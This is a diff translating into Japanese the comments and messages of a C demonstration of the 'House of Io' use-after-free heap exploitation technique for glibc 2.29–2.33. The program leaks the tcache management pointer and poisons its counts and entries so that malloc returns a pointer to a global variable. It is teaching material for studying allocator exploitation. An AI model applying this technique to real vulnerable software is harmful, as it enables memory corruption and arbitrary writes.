@@ -4,28 +4,28 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-// House of Io - Use after free Variant
+// House of Io - Use after free(解放後使用)版
 // ====================================
 //
 // Source: https://awaraucom.wordpress.com/2020/07/19/house-of-io-remastered/
 //
-// Tested on libc versions 2.31, 2.32 and 2.33.
+// libc バージョン 2.31、2.32、2.33 でテストされています。
 //
-// House of Io makes use of the fact, that when freeing a chunk into the tcache
-// the chunk will receive a pointer to the tcache management struct which has
-// been allocated beforehand. This pointer is the tcache->key entry of a free'd
-// tcache chunk. There are three different versions of this attack and all work
-// even with safe-link enabled, as the tcache-key pointer, and more importantly
-// the pointers in the tcache_perthread_struct, are not protected.
+// House of Io は、チャンク(chunk)を tcache に free するとき、
+// そのチャンクが、あらかじめ割り当てられている tcache 管理構造体へのポインタを
+// 受け取るという事実を利用します。このポインタは、free された
+// tcache チャンクの tcache->key エントリです。この攻撃には3つのバージョンがあり、
+// いずれも safe-link が有効でも動作します。tcache の key ポインタ、そしてより重要なことに
+// tcache_perthread_struct 内のポインタが保護されていないためです。
 //
-// House of Io only works in libc versions 2.29 - 2.33, because in these
-// versions the key of a tcache entry is the pointer to the tcache management
-// struct. This can allow an attacker to carry out a tcache_metadata_poisoning
-// attack.
+// House of Io は libc バージョン 2.29 - 2.33 でのみ動作します。これらの
+// バージョンでは、tcache エントリの key が tcache 管理構造体への
+// ポインタになっているためです。これにより、攻撃者は tcache_metadata_poisoning
+// 攻撃を実行できる可能性があります。
 //
-// However the exploit primitives are very constrained as stated in the source.
-// Negative overflows are very rare and so is the needed order of specific frees
-// for the double free variant. This use after free is a bit more realistic.
+// ただし、元の記事に書かれているとおり、このエクスプロイトのプリミティブはかなり制約されています。
+// 負方向のオーバーフローはまれで、double free 版に必要な
+// 特定の順序での free もまれです。この use after free 版は、もう少し現実的です。
 
 unsigned long global_var = 1;
 
@@ -43,60 +43,60 @@ int main() {
   setbuf(stdin, NULL);
   setbuf(stdout, NULL);
 
-  puts("In house of Io we make use of the fact, that a free'd tcache chunk\n"
-       "gets a pointer to the tcache management struct inserted at the\n"
-       "second slot.\n");
+  puts("House of Io では、free された tcache チャンクの2番目のスロットに、\n"
+       "tcache 管理構造体へのポインタが挿入されるという\n"
+       "事実を利用します。\n");
 
   puts(
-      "This variant is the use-after-free variant and can be used, if the\n"
-      "free'd struct has a pointer at offset +0x08, which can be read from\n"
-      "and written to. This pointer will be the tcache->key entry of the\n"
-      "free'd chunk, which contains a pointer to the tcache management\n"
-      "struct. If we use that pointer we can manipulate the tcache management\n"
-      "struct into returning an arbitrary pointer.\n");
+      "このバージョンは use-after-free 版で、free された構造体の\n"
+      "オフセット +0x08 に、読み書きできるポインタがある場合に使えます。\n"
+      "このポインタは free されたチャンクの tcache->key エントリで、\n"
+      "tcache 管理構造体へのポインタを含んでいます。\n"
+      "このポインタを使えば、tcache 管理構造体を操作して、\n"
+      "任意のポインタを返させることができます。\n");
 
-  printf("Specifically we get a pointer to the `global_var` at %p returned to\n"
-         "us from malloc.\n\n",
+  printf("具体的には、%p にある `global_var` へのポインタが、\n"
+         "malloc から返されるようにします。\n\n",
          &global_var);
 
-  puts("First we have to allocate a struct, that has a pointer at offset\n"
-       "+0x08.\n");
+  puts("まず、オフセット +0x08 にポインタを持つ構造体を\n"
+       "割り当てる必要があります。\n");
   struct overlay *ptr = malloc(sizeof(struct overlay));
 
   ptr->next = malloc(0x10);
   ptr->key = malloc(0x10);
 
-  puts("Then we immedietly free that struct to get a pointer to the tcache\n"
-       "management struct.\n");
+  puts("次に、その構造体をすぐに free して、tcache 管理構造体への\n"
+       "ポインタを得ます。\n");
   free(ptr);
 
-  printf("The tcache struct is located at %p.\n\n", ptr->key);
+  printf("tcache 構造体は %p にあります。\n\n", ptr->key);
   struct tcache_perthread_struct *management_struct =
       (struct tcache_perthread_struct *)ptr->key;
 
   puts(
-      "Now that we have a pointer to the management struct we can manipulate\n"
-      "its values. First we potentially have to increase the counter of the\n"
-      "first bin by to a number higher than zero, to make the tcache think we\n"
-      "free'd at least one chunk. In our case this is not necesarry because\n"
-      "the `overlay` struct fits in the first bin and we have free'd that\n"
-      "already. The firest member of the tcache_perthread_struct is the array\n"
-      "of counters. So by overwriting the first element of our pointer we set\n"
-      "the correct value in the array.\n");
+      "これで管理構造体へのポインタを得たので、その値を操作できます。\n"
+      "まず、場合によっては、最初の bin のカウンタを 0 より大きい数に\n"
+      "増やして、少なくとも1つのチャンクを free したと tcache に思わせる\n"
+      "必要があります。今回は、`overlay` 構造体が最初の bin に収まり、\n"
+      "すでにそれを free しているため、この操作は必要ありません。\n"
+      "tcache_perthread_struct の最初のメンバは、カウンタの配列です。\n"
+      "そのため、ポインタの最初の要素を上書きすることで、\n"
+      "配列に正しい値を設定します。\n");
   management_struct->counts[0] = 1;
 
-  printf("Before we overwrite the pointer in the tcache bin, the bin contains\n"
-         "[ %p ]. This is the same as the free'd overlay struct which we\n"
-         "created at the start [ %p == %p ].\n\n",
+  printf("tcache bin のポインタを上書きする前、この bin には\n"
+         "[ %p ] が入っています。これは、最初に作った free 済みの overlay 構造体と\n"
+         "同じです [ %p == %p ]。\n\n",
          management_struct->entries[0], management_struct->entries[0], ptr);
   management_struct->entries[0] = (uint64_t)&global_var;
   printf(
-      "After the write we have placed a pointer to the global variable into\n"
-      "the tcache [ %p ].\n\n",
+      "書き込みの後、グローバル変数へのポインタが\n"
+      "tcache に入りました [ %p ]。\n\n",
       management_struct->entries[0]);
 
-  puts("If we now allocate a new chunk from that tcache bin we get a pointer\n"
-       "to our target location.\n");
+  puts("この tcache bin から新しいチャンクを割り当てると、\n"
+       "標的の位置へのポインタが得られます。\n");
   uint64_t *evil_chunk = malloc(0x10);
 
   assert(evil_chunk == &global_var);
